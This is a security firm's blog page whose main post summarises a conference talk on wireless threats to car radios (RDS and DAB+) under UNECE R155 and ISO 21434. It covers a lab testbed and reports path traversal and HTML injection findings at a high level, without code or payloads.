* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_53a1f75d_20250126_020849.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **DAB**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **DAB**. [Show all posts](https://blog.mindedsecurity.com/)

## Thursday, July 28, 2022

# [UN ECE 155 Threats in the real world: Wireless Networking Attacks and Mitigations. A case study](https://blog.mindedsecurity.com/2022/07/un-ece-155-threats-in-real-world.html)

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiudD_Xp3lJCAzIrQrT-FSjXcxXuz72qLmrLHvFKhQhJzoSnmy-gWoWrCt-FNmbbFiylX3byUeWjZuJk7XE41wIFarc3fREroKYz7qMjXC4-l1BQJYbnvSpIUX-5LzdviiunBR1TrfDHRt-qKBvgpJNAHV8KOsUeDJM3M1Me3_ySBLstqadk8_JwyZk)](https://blogger.googleusercontent.com/img/a/AVvXsEiudD_Xp3lJCAzIrQrT-FSjXcxXuz72qLmrLHvFKhQhJzoSnmy-gWoWrCt-FNmbbFiylX3byUeWjZuJk7XE41wIFarc3fREroKYz7qMjXC4-l1BQJYbnvSpIUX-5LzdviiunBR1TrfDHRt-qKBvgpJNAHV8KOsUeDJM3M1Me3_ySBLstqadk8_JwyZk)
On March the 31st, I gave a [quick talk](https://italy.vehiclemeetings.com/index.php/conference/program/program-day-2.html) on automotive security at [VTM](https://italy.vehiclemeetings.com/index.php) titled "**UN ECE 155 Threats in the real world: Wireless Networking Attacks and Mitigations. A case study**" ([slides here](https://mindedsecurity.com/wp-content/uploads/2022/07/DIPAOLA_IMQ_VTM_2022.pdf)).

The idea was to create some content about one of the *most hyped topics* in the automotive cyber security world over the last year, without keeping it just theoretical;

[UN/ECE 155](https://unece.org/transport/documents/2021/03/standards/un-regulation-no-155-cyber-security-and-cyber-security) and [ISO/SAE 21434](https://www.iso.org/standard/70918.html) whose concerns are about the implementation of a CSMS (Cyber Security Management System) which consists in performing, for each vehicle, several high level security tasks, such as Threat Analysis and Risk Assessment (TARA), supply chain security issues tracking, implementation of the mitigations, update management and so on.

The following schema shows the product development lifecycle model, called [V-Model](https://en.wikipedia.org/wiki/V-Model), used in the automotive industry and the cybersecurity processes in each phase of the V-Model.

![](https://lh4.googleusercontent.com/1w47GbhM6KsZeduLejmcHjwimwwNm3cslMo_SDs8cpY3kdkBVpL-r4xQuYk3fTk84PKFWbNoTAig6OzboYlmaO1pPkmeiPekS7eqAA5bwWqluk0Y7bwmAR0VA8K_bqkeqiy6wINWAFjMSMOCy1qZIw=w400-h249)

The most interesting point that can help mitigating the risks and performing attack surface analysis is the TARA which can really help to minimize the risk in the earliest stage. In particular it will give its best, well when the technologies that are going to be implemented, *are well known from a security perspective*.

The following figure describes the steps that must be covered to perform a TARA by the ISO 21434:

![](https://lh4.googleusercontent.com/gPxH7kj3KglNrhtMJPwjz7c-9ea3SLTvap2NZHGedi_1_8FDwnnskmdnxK7k6DAvVwz71BHcdGun8RwfQ4XDs3UkJivTRyDwtjSv0HIP012-dexgowspCOIz36rbCfwOs4gb_ZZDIzlRqBo0RxxZlQ)

Since the audience was expected to be mixed technical/non technical I decided to keep it in the middle as well, which, alas, sometimes means the hard way.

Also*,* how to go practical without going vehicle specific? mmm, take something that is already on every vehicle and talk about attacks, risks and remediations in the context of UNECE R155 and ISO 21434 requirements.

### **Digital Radio Broadcasting!**

Now, the problem is to research on those topics without being too obvious and condense all in a limited span of 30 minutes which is quite challenging.

With the goal of identifying some unexplored attack surface, I took a couple of weeks to go into [RDS](http://www.interactive-radio-system.com/docs/EN50067_RDS_Standard.pdf) and [DAB+](https://www.worlddab.org/dab/technical-specifications) specifications and [their](https://www.blackhat.com/presentations/bh-usa-07/Barisani_and_Bianco/Presentation/bh-usa-07-barisani_and_bianco.pdf) [previous](https://www.bastibl.net/rds-tmc/) [research](https://troopers.de/media/filer_public/18/4f/184fa903-3610-4647-9cb0-bb7644d3f295/broadcasting_your_attack_security_testing_dab_radio_in_cars.pdf) in the security context.

As briefly described in the slides in IMQ Minded Security I created a lab testbed with:

* A **RDS transmitter** using Raspberry PI and this [wonderful piece of software](https://github.com/ChristopheJacquet/PiFmRds)
* Several non automotive **RDS receivers** and their software and a Renault Scenic 2015 Head Unit with RDS support.
* A **DAB+ transmitter** using *HackRF One*, and this essential [set of software](https://www.opendigitalradio.org/mmbtools) together with this very useful [tutorial](https://medium.com/%40sundayglee/digital-radio-transmission-using-limesdr-and-odr-part-1-b1bcb274d23c%20).
* A *RTL-SDR* for local tests and a **DAB+ USB Dongle receiver** that is also used in the automotive world with the most used *Android Automotive OS*  software [DAB-Z](https://play.google.com/store/apps/details?id=com.zoulou.dab&hl=it&gl=US) and several other applications that are mostly used in desktop environments. Alas, apart from DAB-Z we had no immediately available automotive head units supporting DAB+ :/.

The threats were identified after reading the whole RDS and DAB+ documentation and condensed for the talk.

The most interesting turned out to be DAB+ which has much more [perimeter](https://www.worlddab.org/dab/technical-specifications).

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi-n8WiaoeeYup2cAn9D5z1ZUwBwcli0dbC8qQaoDtXZPkoAwHMa3At73nEvaP6IP5d16Cl1tnxx7pkf4fQw12iOkP7k7scA9Eyiyqvegatq4gsCRAsLwXSavxeftoyVrx_Un5heQT9CyLUq2t60E8EDcof8ospFYCVTcFLYvrZ_FOVgaxn_GWSlpdK=w400-h217)](https://blogger.googleusercontent.com/img/a/AVvXsEi-n8WiaoeeYup2cAn9D5z1ZUwBwcli0dbC8qQaoDtXZPkoAwHMa3At73nEvaP6IP5d16Cl1tnxx7pkf4fQw12iOkP7k7scA9Eyiyqvegatq4gsCRAsLwXSavxeftoyVrx_Un5heQT9CyLUq2t60E8EDcof8ospFYCVTcFLYvrZ_FOVgaxn_GWSlpdK)

and has already at least one known real [world issue](https://www.theregister.com/2022/02/10/mazda_radios_images/).

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjVkSxBWvH1pj-pmbH0XkIGw5nhS0BKHC2nIz9t44uDQMv7oS0V-OqtDWLEOwE3-v8LeDnVNuXBUA4BFpXfsIZ_P9wb6mpJpk2zs6zEqT41rI_smiQQkFFhstXueKUGofURZSgMrl1R4xm9jWxfIRuclqjgUIy9pKHO7zxP5qFi7Us7i1csvD-KeJ6S=w400-h169)](https://blogger.googleusercontent.com/img/a/AVvXsEjVkSxBWvH1pj-pmbH0XkIGw5nhS0BKHC2nIz9t44uDQMv7oS0V-OqtDWLEOwE3-v8LeDnVNuXBUA4BFpXfsIZ_P9wb6mpJpk2zs6zEqT41rI_smiQQkFFhstXueKUGofURZSgMrl1R4xm9jWxfIRuclqjgUIy9pKHO7zxP5qFi7Us7i1csvD-KeJ6S)

Next step was to identify a number of possible threats and attacks by studying the DAB+ specifications, a subset of tests was shown during the talk:
[![](https://blogger.googleusercontent.com/img/a/AVvXsEifiUjuR3a6anTy02t3Up95xBVMBt2yqnFAtrXjDsCyuyyCo6ES3-mvRKAvxyhWZA2iTeEUKJ_6Sv9omhQShjUP7OHncVjtP3LcoFsG6Yhyu7piMxmZaaEdoFK8YX9QLx6VTnHAmHMfo-eD0_N13gnXaCVSB9nRg1kdP0aYxDk1mZDmHA7GQn99wn06)](https://blogger.googleusercontent.com/img/a/AVvXsEifiUjuR3a6anTy02t3Up95xBVMBt2yqnFAtrXjDsCyuyyCo6ES3-mvRKAvxyhWZA2iTeEUKJ_6Sv9omhQShjUP7OHncVjtP3LcoFsG6Yhyu7piMxmZaaEdoFK8YX9QLx6VTnHAmHMfo-eD0_N13gnXaCVSB9nRg1kdP0aYxDk1mZDmHA7GQn99wn06)
Apart from creating **filenames with no extension**, we identified several more possible attacks on parsers such as creating malformed unicode filenames, EPG, Journaline and other DAB+ defined formats.The stumbling blocks when going practical was that some of those formats were not implemented by the receivers we tested, so we decided to keep the tests for future activities.
### Results

The most interesting issues were found on DAB+ desktop software, resulting in path traversal and HTML injection.
[![](https://blogger.googleusercontent.com/img/a/AVvXsEir56guXWYS-tzk8SnAHLpMriSsQqtiQVqgjFWVSZyT0_Oi9uqBaSpPqj6YXdiWH-X5LEZaO1xuILvecCQRc04L-5o7RLCtnq0idDPUy6GBeS0E8R7nz9QhUkn1cgeRDthw-Kciw0wDBm01NykOl7PsfJjYkQ2e3ZVOgKvEnBarZvbr_Zd_jDlyZEcj)](https://blogger.googleusercontent.com/img/a/AVvXsEir56guXWYS-tzk8SnAHLpMriSsQqtiQVqgjFWVSZyT0_Oi9uqBaSpPqj6YXdiWH-X5LEZaO1xuILvecCQRc04L-5o7RLCtnq0idDPUy6GBeS0E8R7nz9QhUkn1cgeRDthw-Kciw0wDBm01NykOl7PsfJjYkQ2e3ZVOgKvEnBarZvbr_Zd_jDlyZEcj)

Unfortunately, the lack of head units or vehicles prevented us to perform more thorough tests to get some more juicy stuff..Let's see what the next weeks will give back, since we are expecting new hardware to perform more tests!
PS. We were expecting to have a video of the talk to publish, but it's not clear when and if.. so here are the slides of the talk:["**UN ECE 155 Threats in the real world: Wireless Networking Attacks and Mitigations. A case study**"](https://mindedsecurity.com/wp-content/uploads/2022/07/DIPAOLA_IMQ_VTM_2022.pdf)
Feel free to comment or [contact us](https://mindedsecurity.com/contact-us/) for any question!

By

[Stefano Di Paola](https://www.blogger.com/profile/11966634329749157589 "author profile")

at

[8:02 AM](https://blog.mindedsecurity.com/2022/07/un-ece-155-threats-in-real-world.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2022/07/un-ece-155-threats-in-real-world.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=4129519644856236239&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4129519644856236239&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4129519644856236239&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4129519644856236239&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4129519644856236239&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4129519644856236239&target=pinterest "Share to Pinterest")

Labels:
[Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
,
[DAB](https://blog.mindedsecurity.com/search/label/DAB)
,
[ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
,
[RDS](https://blog.mindedsecurity.com/search/label/RDS)
,
[security](https://blog.mindedsecurity.com/search/label/security)
,
[TARA](https://blog.mindedsecurity.com/search/label/TARA)
,
[UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)

[Older Posts](https://blog.mindedsecurity.com/search/label/DAB?updated-max=2022-07-28T08:02:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* DAB

  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
